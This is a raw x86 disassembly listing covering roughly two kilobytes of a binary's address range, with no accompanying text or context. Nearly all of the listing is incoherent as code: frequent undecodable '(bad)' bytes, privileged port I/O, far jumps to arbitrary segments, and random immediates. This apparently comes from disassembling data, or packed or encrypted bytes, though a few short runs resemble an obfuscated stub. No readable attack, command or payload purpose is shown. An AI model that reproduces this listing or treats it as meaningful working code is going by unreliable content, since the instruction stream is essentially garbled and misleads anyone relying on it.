  412502:	pop    esi
  412503:	fsub   DWORD PTR [ecx+0x7e]
  412506:	xor    ebx,eax
  412508:	mov    dh,0xde
  41250a:	daa    
  41250b:	cmp    ebx,DWORD PTR [ecx+ebx*8+0x1890a7b8]
  412512:	sbb    BYTE PTR [eax],ah
  412514:	ror    BYTE PTR [esi],0x60
  412517:	mov    dh,0xbf
  412519:	stos   DWORD PTR es:[edi],eax
  41251a:	fild   QWORD PTR [edx+0x70f81616]
  412520:	push   edx
  412521:	into   
  412522:	les    ebx,FWORD PTR [esi-0x75]
  412525:	pop    ds
  412526:	(bad)  
  412527:	jge    0x41256e
  412529:	adc    esi,DWORD PTR [edi]
  41252b:	out    0x6a,eax
  41252d:	xchg   edi,eax
  41252e:	mov    bl,0x6d
  412530:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412531:	xor    bh,BYTE PTR [ebx]
  412533:	imul   esp,DWORD PTR [esi-0x4b6b95cf],0xffffffab
  41253a:	loopne 0x4124ff
  41253c:	pop    esi
  41253d:	arpl   WORD PTR [eax-0x52f5d886],bp
  412543:	outs   dx,DWORD PTR ds:[esi]
  412544:	fs push cs
  412546:	add    eax,0x779b00c7
  41254b:	fwait
  41254c:	mov    BYTE PTR [ebx],ah
  41254e:	fst    st(3)
  412550:	int3   
  412551:	cdq    
  412552:	out    0xfa,al
  412554:	cmp    DWORD PTR [eax+0x17],ebp
  412557:	xor    eax,0x1a701c10
  41255c:	(bad)  
  41255d:	aad    0xdb
  41255f:	out    0xa2,al
  412561:	inc    ebx
  412562:	aad    0x89
  412564:	outs   dx,DWORD PTR ds:[esi]
  412565:	into   
  412566:	sbb    ecx,esp
  412568:	jb     0x412573
  41256a:	xor    dl,BYTE PTR [edi+ecx*4+0x73]
  41256e:	int    0x53
  412570:	xchg   ebx,eax
  412571:	pop    edi
  412572:	or     al,0x3b
  412574:	push   es
  412575:	lods   eax,DWORD PTR ds:[esi]
  412576:	mov    eax,0x51577edb
  41257b:	or     BYTE PTR [ebx+ecx*4-0x7101cb58],0x4e
  412583:	cli    
  412584:	daa    
  412585:	cmp    edx,ebp
  412587:	(bad)  
  412588:	mov    eax,0xab45e110
  41258d:	mov    es,WORD PTR ds:0xf543d079
  412593:	sub    BYTE PTR fs:[ebx+0x27],ah
  412597:	aad    0xef
  412599:	xchg   BYTE PTR [edi+0x557ac114],ah
  41259f:	in     eax,dx
  4125a0:	in     eax,dx
  4125a1:	iret   
  4125a2:	cmp    DWORD PTR [ecx+0x4664d181],edx
  4125a8:	(bad)  
  4125a9:	and    eax,DWORD PTR [esi-0x364643bb]
  4125af:	je     0x41254d
  4125b1:	cmc    
  4125b2:	or     ah,BYTE PTR [edi]
  4125b4:	pop    ebp
  4125b5:	aam    0x98
  4125b7:	test   DWORD PTR [edx-0x3459e69a],esi
  4125bd:	lea    ebp,[edi]
  4125bf:	sbb    al,0x2e
  4125c1:	lss    esi,FWORD PTR [ebp-0x61b15d78]
  4125c8:	jb     0x4125c1
  4125ca:	xor    esp,esp
  4125cc:	out    0x92,eax
  4125ce:	xchg   esi,eax
  4125cf:	rcr    DWORD PTR [esi+0x69],cl
  4125d2:	leave  
  4125d3:	test   BYTE PTR [eax+edi*4-0x45207462],0x1d
  4125db:	mov    eax,ds:0xa315d200
  4125e0:	sub    eax,0xb89ccded
  4125e5:	mov    ebp,0x20907f34
  4125ea:	int3   
  4125eb:	adc    DWORD PTR [edx+0x7d67d026],ebp
  4125f1:	outs   dx,DWORD PTR ds:[esi]
  4125f2:	lahf   
  4125f3:	inc    ecx
  4125f4:	cmp    ebx,ebp
  4125f6:	add    al,0x9e
  4125f8:	jns    0x41262d
  4125fa:	or     eax,0xd52878ab
  4125ff:	adc    ebp,DWORD PTR [ecx-0x4a98e12b]
  412605:	add    ebp,DWORD PTR [ebx+0x65]
  412608:	addr16 jb 0x412609
  41260b:	jl     0x41266b
  41260d:	stos   BYTE PTR es:[edi],al
  41260e:	leave  
  41260f:	push   0x6b6ea079
  412614:	and    ebp,DWORD PTR [ebx]
  412616:	adc    DWORD PTR [esi+esi*1-0x70],edx
  41261a:	fstp   TBYTE PTR [ebx-0x3f]
  41261d:	mov    WORD PTR [edi-0x21ed758c],?
  412623:	std    
  412624:	int3   
  412625:	rol    DWORD PTR [edi+edx*8-0x6f],1
  412629:	cwde   
  41262a:	mov    bh,0xb5
  41262c:	cmc    
  41262d:	add    al,BYTE PTR [ebp-0x5a1b8842]
  412633:	xchg   ebp,eax
  412634:	out    dx,al
  412635:	gs jns 0x412656
  412638:	stos   DWORD PTR es:[edi],eax
  412639:	jno    0x4126a1
  41263b:	sbb    eax,0x2e3ba6e7
  412640:	test   dl,bl
  412642:	div    DWORD PTR [ecx+0x63ebbbd6]
  412648:	in     eax,0x16
  41264a:	jmp    0x2b32f8ee
  41264f:	mov    eax,ds:0xfe772e07
  412654:	inc    ebp
  412655:	fdivr  QWORD PTR [edx+0xa]
  412658:	les    esp,FWORD PTR [eax-0x5610b4cd]
  41265e:	push   eax
  41265f:	xor    BYTE PTR [edi],al
  412661:	(bad)  
  412662:	(bad)  
  412663:	jns    0x412698
  412665:	add    eax,0xa9593e8f
  41266a:	mov    ecx,0x874b86c5
  41266f:	sti    
  412670:	pop    esp
  412671:	loop   0x412618
  412673:	scas   al,BYTE PTR es:[edi]
  412674:	jnp    0x4125fe
  412676:	cli    
  412677:	repnz pop ds
  412679:	(bad)  
  41267a:	push   cs
  41267b:	js     0x4126f4
  41267d:	push   esi
  41267e:	ffreep st(5)
  412680:	or     al,0xa1
  412682:	(bad)  
  412683:	or     BYTE PTR [eax],dl
  412685:	mov    dh,0x1c
  412687:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412688:	cmp    BYTE PTR [ecx+0x56],bh
  41268b:	lds    edx,FWORD PTR ds:0x9ed6086d
  412691:	jle    0x4126b4
  412693:	stos   DWORD PTR es:[edi],eax
  412694:	dec    eax
  412695:	hlt    
  412696:	cmp    ch,BYTE PTR [esi+0x64bf2913]
  41269c:	mov    ch,0x5e
  41269e:	daa    
  41269f:	es repz and esi,esp
  4126a3:	jne    0x4126ec
  4126a5:	push   0xb214b38a
  4126aa:	fcomp  QWORD PTR [ebx-0x39]
  4126ad:	sahf   
  4126ae:	loope  0x412659
  4126b0:	std    
  4126b1:	and    al,0x3a
  4126b3:	xor    ebp,DWORD PTR [edi]
  4126b5:	jns    0x4126dc
  4126b7:	out    0xdb,al
  4126b9:	pusha  
  4126ba:	imul   esi,DWORD PTR [edx],0xffffffeb
  4126bd:	xchg   DWORD PTR [ebp+0x70],ebx
  4126c0:	pop    edx
  4126c1:	loope  0x41267b
  4126c3:	xlat   BYTE PTR ds:[ebx]
  4126c4:	(bad)  
  4126c5:	and    eax,DWORD PTR [ecx]
  4126c7:	inc    esp
  4126c8:	jl     0x41269f
  4126ca:	jns    0x4126ea
  4126cc:	das    
  4126cd:	dec    ecx
  4126ce:	cmp    al,0x96
  4126d0:	xchg   ecx,eax
  4126d1:	test   al,0x38
  4126d3:	clc    
  4126d4:	or     al,0xdb
  4126d6:	std    
  4126d7:	outs   dx,BYTE PTR ds:[esi]
  4126d8:	bound  esp,QWORD PTR [eax]
  4126da:	adc    al,0xa6
  4126dc:	dec    esi
  4126dd:	jg     0x41267a
  4126df:	dec    eax
  4126e0:	leave  
  4126e1:	shl    DWORD PTR [ecx],0x29
  4126e4:	mov    edi,0x6b0c2616
  4126e9:	loop   0x41271d
  4126eb:	hlt    
  4126ec:	outs   dx,DWORD PTR ds:[esi]
  4126ed:	xor    eax,0xc6ea0c2a
  4126f2:	add    esp,DWORD PTR [eax+0x21]
  4126f5:	and    ecx,DWORD PTR [esp+ebx*1]
  4126f8:	daa    
  4126f9:	and    edx,DWORD PTR [eax+ebx*8]
  4126fc:	pushf  
  4126fd:	movq   QWORD PTR [eax],mm0
  412700:	daa    
  412701:	test   eax,0x560712de
  412706:	(bad)  
  412708:	repnz sub bl,BYTE PTR [ebx]
  41270b:	(bad)  
  41270c:	mov    ecx,0x8018b54f
  412711:	push   ss
  412712:	cmp    BYTE PTR [ecx+0xe0b29ee],0xf0
  412719:	xchg   DWORD PTR [ecx],ecx
  41271b:	pop    ss
  41271c:	cmp    eax,0xc40beedb
  412721:	int3   
  412722:	(bad)  cs:[esi]
  412725:	dec    esp
  412726:	mov    dl,0x52
  412728:	inc    ebp
  412729:	xchg   ebp,eax
  41272b:	push   es
  41272c:	mov    DWORD PTR [ebx-0x3a],esi
  41272f:	pop    edx
  412730:	mov    edx,0xdcffdb3a
  412735:	mov    DWORD PTR [ebp-0xc],0xf89c8539
  41273c:	mov    DWORD PTR [ebp-0x44],0xf89c853a
  412743:	jmp    0x4129cb
  412748:	int    0xcb
  41274a:	ror    esp,0xd9
  41274d:	fcmove st,st(5)
  41274f:	leave  
  412750:	sub    al,0xaa
  412752:	(bad)  
  412754:	jp     0x412786
  412756:	stos   DWORD PTR es:[edi],eax
  412757:	push   edx
  412758:	stos   BYTE PTR es:[edi],al
  412759:	ins    BYTE PTR es:[edi],dx
  41275a:	js     0x4127d4
  41275c:	in     eax,0x7e
  41275e:	js     0x4127d8
  412760:	jmp    0xd826:0xa559abd3
  412767:	sbb    BYTE PTR [esi],al
  412769:	int3   
  41276a:	iret   
  41276b:	adc    esi,edx
  41276d:	js     0x4127c8
  41276f:	mov    bl,0xf1
  412771:	call   0xf4f8:0xceb7efc9
  412778:	scas   al,BYTE PTR es:[edi]
  412779:	fdivr  st,st(6)
  41277b:	sub    al,0xac
  41277d:	in     eax,0xf9
  41277f:	push   0x5885b2c
  412784:	pop    ecx
  412785:	pop    edx
  412786:	and    cl,BYTE PTR [eax]
  412788:	inc    ebx
  412789:	sub    eax,0x1a8db9a1
  41278e:	sbb    BYTE PTR [edx-0x3bb7eb1b],0x3b
  412795:	ror    BYTE PTR [edi+0x7b2d1a1c],cl
  41279b:	outs   dx,DWORD PTR ds:[esi]
  41279c:	sbb    ebp,eax
  41279e:	cmp    DWORD PTR [ecx+0x3463c4f3],ebx
  4127a4:	mov    ds:0x22c30f11,eax
  4127a9:	fist   DWORD PTR [ecx]
  4127ab:	(bad)  
  4127ac:	xlat   BYTE PTR ds:[ebx]
  4127ad:	sbb    edi,esp
  4127af:	cmp    edi,DWORD PTR [edx]
  4127b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127b2:	push   edi
  4127b3:	test   DWORD PTR [esi],0x6afadd0b
  4127b9:	sbb    DWORD PTR ds:0x16c2883c,0xeb10a701
  4127c3:	and    al,0xe0
  4127c5:	imul   ebx,DWORD PTR [ebx+0x6f20dbdb],0xffffff9a
  4127cc:	mov    ch,0x99
  4127ce:	jbe    0x41282d
  4127d0:	jecxz  0x4127d4
  4127d2:	fs in  eax,dx
  4127d4:	in     al,0xc1
  4127d6:	pusha  
  4127d7:	(bad)  
  4127d8:	sar    DWORD PTR gs:[esi-0x4a],1
  4127dc:	aam    0xf5
  4127de:	lds    edx,FWORD PTR [esi-0x14]
  4127e1:	add    DWORD PTR [ebx+0x19],ebp
  4127e4:	ins    DWORD PTR es:[edi],dx
  4127e5:	push   ss
  4127e6:	and    ebp,edx
  4127e8:	mov    ah,0xb3
  4127ea:	sbb    dl,BYTE PTR [edx-0x145ac135]
  4127f0:	and    al,0x19
  4127f2:	bound  esi,QWORD PTR [eax]
  4127f4:	loop   0x412823
  4127f6:	repnz popf 
  4127f8:	(bad)  
  4127f9:	outs   dx,DWORD PTR ds:[esi]
  4127fa:	cmp    ah,dh
  4127fc:	pop    edi
  4127fd:	add    al,0xe7
  4127ff:	sub    DWORD PTR [ecx+0x4a],0xffffff8d
  412803:	and    bh,ah
  412805:	dec    eax
  412806:	ffreep st(4)
  412808:	sbb    eax,0xc3a80d11
  41280d:	retf   0xe814
  412810:	lods   al,BYTE PTR ds:[esi]
  412811:	jb     0x412849
  412813:	inc    ebx
  412814:	(bad)  
  412815:	jno    0x412846
  412817:	iret   
  412818:	dec    edx
  412819:	stos   DWORD PTR es:[edi],eax
  41281a:	cld    
  41281b:	mov    ebx,0xafa20975
  412820:	call   0x1f34:0xc4d76133
  412827:	cld    
  412828:	mov    dl,0x3d
  41282a:	or     ah,BYTE PTR [esp+edi*2-0x4b]
  41282e:	fst    DWORD PTR gs:[edi+ebp*4+0x3b]
  412833:	mov    fs,ebx
  412835:	pop    ds
  412836:	retf   
  412837:	arpl   WORD PTR [esi],cx
  412839:	popf   
  41283a:	sub    dh,bh
  41283c:	loop   0x4128b2
  41283e:	fisttp WORD PTR [ebx+0x76]
  412841:	dec    esi
  412842:	push   ebx
  412843:	fwait
  412844:	clc    
  412845:	inc    esi
  412846:	inc    ebp
  412847:	mov    ecx,0x9ae2f2bc
  41284c:	std    
  41284d:	cs ret 0x9764
  412851:	in     eax,0xeb
  412853:	cmp    al,BYTE PTR [eax+0x4d54280f]
  412859:	mov    BYTE PTR [ebp-0x79430242],ah
  41285f:	inc    ecx
  412860:	stos   BYTE PTR es:[edi],al
  412861:	pop    ds
  412862:	ret    0xc55e
  412865:	mov    ah,0xb3
  412867:	mov    ecx,0xfd0a3771
  41286c:	push   eax
  41286d:	sub    DWORD PTR [ebp-0x5f],edx
  412870:	or     bh,BYTE PTR [ecx]
  412872:	mov    ebx,0x4023bdd2
  412877:	arpl   dx,bp
  412879:	add    BYTE PTR [esi+eiz*1-0x5],dl
  41287d:	add    edi,DWORD PTR [eax]
  41287f:	into   
  412880:	test   eax,0x5decde1a
  412885:	xchg   esi,eax
  412886:	push   ebx
  412888:	in     eax,dx
  412889:	xlat   BYTE PTR ds:[ebx]
  41288a:	test   dl,ah
  41288c:	stc    
  41288d:	je     0x4128af
  41288f:	xor    BYTE PTR [ebx],ah
  412891:	or     edi,ebx
  412893:	push   0xd1b80f1
  412898:	mov    esp,0x1e10f441
  41289d:	retf   0xf9bc
  4128a0:	cmc    
  4128a1:	nop
  4128a2:	mov    esp,0xdb84bf51
  4128a7:	retf   0xbeea
  4128aa:	retfw  
  4128ac:	stos   DWORD PTR es:[edi],eax
  4128ad:	jecxz  0x412912
  4128af:	inc    ebx
  4128b0:	sub    DWORD PTR [esi-0x46e4f6cf],edx
  4128b6:	push   ebp
  4128b7:	jl     0x4128f7
  4128b9:	iret   
  4128ba:	add    al,0x13
  4128bc:	inc    edx
  4128bd:	push   ss
  4128be:	jb     0x41292d
  4128c0:	data16 adc al,0x4f
  4128c3:	or     BYTE PTR [esi+0x27],dl
  4128c6:	in     al,dx
  4128c7:	enter  0x2f10,0x50
  4128cb:	pop    eax
  4128cc:	pop    ss
  4128cd:	cmp    eax,0x87cb78cf
  4128d2:	loope  0x4128e6
  4128d4:	call   0xd9cfd59a
  4128d9:	jmp    0xac20:0x441fc33e
  4128e0:	cmp    eax,0xdb64a68f
  4128e5:	(bad)  
  4128e6:	push   eax
  4128e7:	ret    0xb7fc
  4128ea:	push   esi
  4128eb:	mov    eax,DWORD PTR [edi]
  4128ed:	xor    al,0x60
  4128ef:	loopne 0x412872
  4128f1:	hlt    
  4128f2:	stos   DWORD PTR es:[edi],eax
  4128f3:	cs or  eax,0x6a442f1e
  4128f9:	(bad)  
  4128fa:	jb     0x412978
  4128fc:	push   esi
  4128fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128fe:	in     eax,dx
  4128ff:	fstp   TBYTE PTR [ecx+0x598dcbf6]
  412905:	mov    ecx,0xb9da4b5b
  41290a:	mov    dh,0x3d
  41290c:	mov    ch,0x8b
  41290e:	dec    ebx
  41290f:	jnp    0x412935
  412911:	rol    DWORD PTR [ebx+0x5e],1
  412914:	jp     0x41297e
  412916:	add    edi,DWORD PTR [ecx+0x71]
  412919:	lods   al,BYTE PTR ds:[esi]
  41291a:	enter  0xb852,0xbc
  41291e:	mov    eax,DWORD PTR [ecx+ecx*1]
  412921:	fs mov ecx,0x39750083
  412927:	jno    0x4128be
  412929:	inc    esi
  41292a:	outs   dx,DWORD PTR ds:[esi]
  41292b:	pop    edx
  41292c:	jmp    0x2c1787ca
  412931:	inc    edi
  412932:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412933:	jecxz  0x4128e7
  412935:	inc    ecx
  412936:	js     0x4128b8
  412938:	or     al,0xb1
  41293a:	loopne 0x412953
  41293c:	mov    ebx,DWORD PTR [ecx+0x34af06f8]
  412942:	loopne 0x4128d6
  412944:	and    BYTE PTR [edx+0x3a],ch
  412947:	mov    edi,DWORD PTR [edx]
  412949:	xchg   esp,eax
  41294a:	mov    ah,0x8f
  41294c:	mov    dh,0x4c
  41294e:	fs adc ah,dl
  412951:	lahf   
  412952:	cmp    al,0x45
  412954:	jae    0x4129b5
  412956:	push   bx
  412958:	sbb    al,0x8d
  41295a:	jbe    0x412942
  41295c:	add    eax,0x54218990
  412961:	cwde   
  412962:	in     al,0x5
  412964:	jl     0x4129cb
  412966:	popa   
  412967:	loope  0x4129cc
  412969:	xlat   BYTE PTR ds:[ebx]
  41296a:	xor    DWORD PTR [ebx],edi
  41296c:	pop    edx
  41296d:	jnp    0x4129cc
  41296f:	push   ebp
  412970:	mov    dh,0x75
  412972:	fisttp QWORD PTR [ebx+0x599382a5]
  412978:	clc    
  412979:	ss ss pop edi
  41297c:	pop    ecx
  41297d:	adc    eax,edi
  41297f:	lods   eax,DWORD PTR ds:[esi]
  412980:	mov    cl,0xe4
  412982:	in     eax,0x82
  412984:	push   esi
  412985:	pusha  
  412986:	adc    BYTE PTR [esi],0x3c
  412989:	adc    al,0xb5
  41298b:	cmp    al,0x5c
  41298d:	fcom   QWORD PTR [eax-0x4b]
  412990:	jmp    0x51ca:0x535c5ac2
  412997:	mov    esi,0x9ca90872
  41299c:	iret   
  41299d:	ds cdq 
  41299f:	pop    ecx
  4129a0:	fist   WORD PTR [ecx-0x31]
  4129a3:	xor    eax,0x95838b2b
  4129a8:	hlt    
  4129a9:	push   0xf850ab7e
  4129ae:	sub    al,0xf8
  4129b0:	retf   
  4129b1:	xchg   edi,eax
  4129b2:	jae    0x412a0b
  4129b4:	test   al,0x13
  4129b6:	jae    0x412939
  4129b8:	sub    al,0xb1
  4129ba:	sbb    ch,BYTE PTR [edx]
  4129bc:	mov    ah,0x3c
  4129be:	push   ds
  4129bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129c0:	xor    cl,ch
  4129c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129c3:	or     DWORD PTR [edx+eax*2],0x5f4cdc4b
  4129ca:	mov    edx,0x33e8558b
  4129cf:	rol    BYTE PTR [ebx],1
  4129d1:	shr    ecx,1
  4129d3:	cwde   
  4129d4:	sldt   WORD PTR [eax]
  4129d7:	mov    edx,DWORD PTR [ebp-0x18]
  4129da:	xor    edx,eax
  4129dc:	add    edx,DWORD PTR [ebp-0x14]
  4129df:	jmp    0x412c67
  4129e4:	(bad)
  4129e7:	ret    0xc1ca
  4129ea:	(bad)
  4129ed:	xlat   BYTE PTR ds:[ebx]
  4129ee:	data16 ja 0x4129fc
  4129f1:	mov    ebp,0x7117b7ea
  4129f6:	js     0x412a70
  4129f8:	in     eax,0x7e
  4129fa:	js     0x412a74
  4129fc:	push   ss
  4129fd:	call   DWORD PTR [esi+edx*8-0x56]
  412a01:	daa    
  412a02:	pop    es
  412a03:	pusha  
  412a04:	or     BYTE PTR [edi],0x4c
  412a07:	jbe    0x412a4b
  412a09:	jl     0x412a18
  412a0b:	int3   
  412a0c:	mov    ebx,DWORD PTR [ebx]
  412a0e:	(bad)  
  412a0f:	sub    al,0xcc
  412a11:	jg     0x412a27
  412a13:	and    bl,BYTE PTR [esi+0x15]
  412a16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a17:	icebp  
  412a18:	ror    DWORD PTR [esi-0x5b6cd7c3],1
  412a1e:	jl     0x4129b3
  412a20:	or     al,0x2b
  412a22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a23:	adc    eax,0x4acf35d3
  412a28:	stos   BYTE PTR es:[edi],al
  412a29:	or     DWORD PTR [edi+0x560b4f35],esp
  412a2f:	pop    edx
  412a30:	cmp    eax,0x2260f985
  412a35:	or     DWORD PTR [esi],esi
  412a37:	lock std 
  412a39:	jb     0x4129ef
  412a3b:	mov    cl,0x36
  412a3d:	(bad)  
  412a3e:	jmp    0x669c9085
  412a43:	add    ah,BYTE PTR [ebx-0x2f]
  412a46:	mov    ah,bl
  412a48:	outs   dx,DWORD PTR ds:[esi]
  412a49:	xlat   BYTE PTR ds:[ebx]
  412a4a:	push   esi
  412a4b:	mov    edx,0xff8cc9d5
  412a50:	jns    0x412a51
  412a52:	loopne 0x412a12
  412a54:	mov    ah,0x22
  412a56:	mov    bh,0x1d
  412a58:	call   0xe996:0xa5bb1db9
  412a5f:	and    dl,ch
  412a61:	mov    edi,0xee2c4d8a
  412a66:	test   BYTE PTR [eax+esi*8+0x266be063],dl
  412a6d:	push   edx
  412a6e:	xor    BYTE PTR [ecx+0x5f],bl
  412a71:	cli    
  412a72:	mov    ebp,0xa2549298
  412a77:	mov    dh,BYTE PTR [edx+0x2fe1bfda]
  412a7d:	mov    ebx,0x502b9cd0
  412a82:	jae    0x412ae0
  412a84:	cwde   
  412a85:	int    0x38
  412a87:	xchg   ecx,eax
  412a88:	xor    eax,0x9ab44d65
  412a8d:	into   
  412a8e:	inc    edi
  412a8f:	jmp    0x412aa2
  412a91:	(bad)  
  412a92:	sar    ecx,1
  412a94:	loopne 0x412ab8
  412a96:	jmp    0x46ab:0x4d9f69f9
  412a9d:	sbb    bh,bh
  412a9f:	mov    ebx,DWORD PTR [ecx-0x3f]
  412aa2:	cmp    al,0xc7
  412aa4:	push   ecx
  412aa5:	fstp   QWORD PTR [edi-0x3aa15036]
  412aab:	loop   0x412ad0
  412aad:	bound  ebp,QWORD PTR [ecx+0x43]
  412ab0:	sahf   
  412ab1:	daa    
  412ab2:	adc    ebp,ebp
  412ab4:	faddp  st(4),st
  412ab6:	fwait
  412ab7:	lods   eax,DWORD PTR ds:[esi]
  412ab8:	xor    eax,0xadeb1750
  412abd:	imul   bl
  412abf:	mov    bl,0xc1
  412ac1:	fcmovne st,st(1)
  412ac3:	arpl   WORD PTR [edx+0x4c5e8022],di
  412ac9:	not    bl
  412acb:	mov    ecx,0xfae25dda
  412ad0:	jns    0x412af8
  412ad2:	sub    al,0x94
  412ad4:	add    DWORD PTR [ecx-0x6add0f8f],0xffffff90
  412adb:	in     eax,0xb
  412add:	cmp    DWORD PTR [ebx+eiz*1-0x164ed0a4],ecx
  412ae4:	arpl   sp,bp
  412ae6:	icebp  
  412ae7:	pop    esp
  412ae8:	(bad)  
  412ae9:	aaa    
  412aea:	mov    ss,WORD PTR [edx-0x56c2e178]
  412af0:	jne    0x412b19
  412af2:	adc    ecx,edx
  412af4:	clc    
  412af5:	fcom   DWORD PTR [esi+ebp*4]
  412af8:	dec    edi
  412af9:	jecxz  0x412b2c
  412afb:	retf   0x5c2e
  412afe:	cmp    BYTE PTR [eax+0x5abeca85],ah
  412b04:	mov    esi,DWORD PTR [edi+0x11]
  412b07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b08:	dec    esi
  412b09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b0a:	inc    eax
  412b0b:	das    
  412b0c:	int    0xe0
  412b0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b0f:	(bad)  
  412b10:	mov    edx,0x7c45324e
  412b15:	ror    BYTE PTR [ebx+0x38893907],1
  412b1b:	add    ch,al
  412b1d:	adc    eax,0x5811e593
  412b22:	inc    eax
  412b23:	inc    esp
  412b24:	add    DWORD PTR [ecx-0x74],eax
  412b27:	stos   DWORD PTR es:[edi],eax
  412b28:	and    esi,ebx
  412b2a:	xor    esi,DWORD PTR ss:[ebx]
  412b2d:	in     al,dx
  412b2e:	xchg   edi,eax
  412b2f:	fdiv   st,st(5)
  412b31:	inc    ebp
  412b32:	dec    esi
  412b33:	adc    DWORD PTR [ebx+0x2957f7a9],ebx
  412b39:	push   ecx
  412b3a:	sbb    ah,BYTE PTR [ecx]
  412b3c:	ds dec eax
  412b3e:	xchg   edi,eax
  412b3f:	nop
  412b40:	cld    
  412b41:	and    BYTE PTR [edi-0x6664637f],al
  412b47:	in     al,0x44
  412b49:	mov    eax,ecx
  412b4b:	cdq    
  412b4c:	sar    BYTE PTR [edx-0x612d7645],1
  412b52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b53:	adc    DWORD PTR [eax+esi*4-0x66],ebx
  412b57:	push   ebp
  412b58:	sbb    DWORD PTR [ebx],edx
  412b5a:	mov    ds:0x3584a612,eax
  412b5f:	mov    eax,ds:0xe80e1943
  412b64:	ins    DWORD PTR es:[edi],dx
  412b65:	xor    DWORD PTR [edx+0x5ada9b93],ecx
  412b6b:	cmp    al,ah
  412b6d:	es or  al,0x8c
  412b70:	pushf  
  412b71:	fwait
  412b72:	or     esi,ecx
  412b74:	arpl   WORD PTR [ebp+0xf],di
  412b77:	xchg   edx,eax
  412b78:	les    edi,FWORD PTR [edi+0x67]
  412b7b:	add    BYTE PTR [esi],dh
  412b7d:	dec    eax
  412b7e:	mov    edi,0x15e89330
  412b83:	fidivr WORD PTR [eax+0x65007a23]
  412b89:	fucom  st(2)
  412b8b:	fild   QWORD PTR [edi]
  412b8d:	fistp  DWORD PTR [esi]
  412b8f:	out    0x83,eax
  412b91:	int3   
  412b92:	ds inc esp
  412b94:	xor    eax,0xdb405d0e
  412b99:	not    DWORD PTR [edi-0x3c]
  412b9c:	inc    esi
  412b9d:	pop    edi
  412b9e:	or     DWORD PTR [edx],edi
  412ba0:	imul   esi,DWORD PTR [ebp-0x76],0x2e1eb964
  412ba7:	push   ecx
  412ba8:	xor    ebp,DWORD PTR [edx]
  412baa:	mov    ch,0xb4
  412bac:	mov    dl,0x5d
  412bae:	nop
  412baf:	push   ebp
  412bb0:	push   ecx
  412bb1:	mov    ebx,0xd514b703
  412bb6:	mov    WORD PTR [ecx+edi*1],gs
  412bb9:	mov    eax,0xef0b28ab
  412bbe:	test   BYTE PTR [esi*2-0x55e483cd],cl
  412bc5:	out    0x50,al
  412bc7:	ss add dh,bl
  412bca:	cmp    DWORD PTR [edx],edi
  412bcc:	dec    ebx
  412bcd:	mov    ah,0x96
  412bcf:	mov    DWORD PTR [edi-0x16],ebx
  412bd2:	pusha  
  412bd3:	aaa    
  412bd4:	mov    ebp,0x5561de01
  412bd9:	add    cl,BYTE PTR [eax]
  412bdb:	cwde   
  412bdc:	mov    al,0x72
  412bde:	sbb    BYTE PTR [edx+ebp*2],0x6
  412be2:	push   ecx
  412be3:	adc    ebx,esi
  412be5:	lods   al,BYTE PTR ds:[esi]
  412be6:	pushf  
  412be7:	shl    DWORD PTR [ebp+0x4b],0xbd
  412beb:	bound  ebp,QWORD PTR [eax-0x6c]
  412bee:	repz pop eax
  412bf0:	cld    
  412bf1:	bound  ebp,QWORD PTR [esi]
  412bf3:	pop    esi
  412bf4:	add    ch,BYTE PTR [ebx+0x8]
  412bf7:	jmp    0x5716:0x7438b737
  412bfe:	inc    ecx
  412bff:	sbb    ebx,DWORD PTR [ebx-0x279a2d96]
  412c05:	or     DWORD PTR [ebx+0xf],0x20
  412c09:	jo     0x412ba3
  412c0b:	add    BYTE PTR [ecx],0x10
  412c0e:	sbb    al,0xf5
  412c10:	add    dl,ch
  412c12:	or     BYTE PTR [edx],ch
  412c14:	fs sahf 
  412c16:	xor    BYTE PTR [ecx+0x5a2c446c],al
  412c1c:	shl    BYTE PTR [ecx+eax*2],0x4f
  412c20:	xor    BYTE PTR [esi-0x59],bh
  412c23:	shl    DWORD PTR [edx+esi*1-0x3f6cfdeb],cl
  412c2a:	in     al,0x6e
  412c2c:	push   di
  412c2e:	in     ax,0xa6
  412c31:	jne    0x412cad
  412c33:	sbb    eax,0xc6f41a48
  412c38:	mov    ss,WORD PTR [ebp-0x3da334d6]
  412c3e:	and    BYTE PTR [edi-0x69693597],cl
  412c44:	and    al,BYTE PTR [edi+0x4]
  412c47:	or     BYTE PTR [edx+0x249d809c],al
  412c4d:	(bad)  
  412c4e:	xchg   ebx,eax
  412c4f:	lds    eax,FWORD PTR [eax]
  412c51:	adc    BYTE PTR [eax+esi*1+0x3],dl
  412c55:	and    al,0xd0
  412c57:	(bad)  
  412c58:	ds and ah,al
  412c5b:	test   al,0xbb
  412c5d:	bound  esi,QWORD PTR [esi-0x423523b2]
  412c63:	into   
  412c64:	sub    al,0x23
  412c66:	mov    cs,WORD PTR [ebx-0x6b751b83]
  412c6c:	cmp    bl,BYTE PTR [eax-0x16ffcd8e]
  412c72:	add    DWORD PTR [edx],0x0
  412c75:	add    ch,cl
  412c77:	int3   
  412c78:	xlat   BYTE PTR ds:[ebx]
  412c79:	enter  0xdbd9,0xd5
  412c7d:	shl    DWORD PTR [ebx-0x62],1
  412c80:	std    
  412c81:	xchg   DWORD PTR [ecx-0x31e70eb],ecx
  412c87:	ja     0x412d01
  412c89:	js     0x412c70
  412c8b:	jle    0x412d05
  412c8d:	js     0x412c26
  412c8f:	retf   0xabc4
  412c92:	dec    edx
  412c93:	and    ebx,DWORD PTR [ebp-0x3fc02939]
  412c99:	mov    edi,0x8392ea80
  412c9e:	and    esp,DWORD PTR [esi+0x4c]
  412ca1:	pop    ecx
  412ca2:	xchg   BYTE PTR [eax+0x18a51dc1],ah
  412ca8:	inc    ebp
  412ca9:	bound  esp,QWORD PTR [ecx-0x68]
  412cac:	fisttp WORD PTR [esi+eax*1-0x16]
  412cb0:	or     ebp,edi
  412cb2:	loop   0x412c7a
  412cb4:	in     al,dx
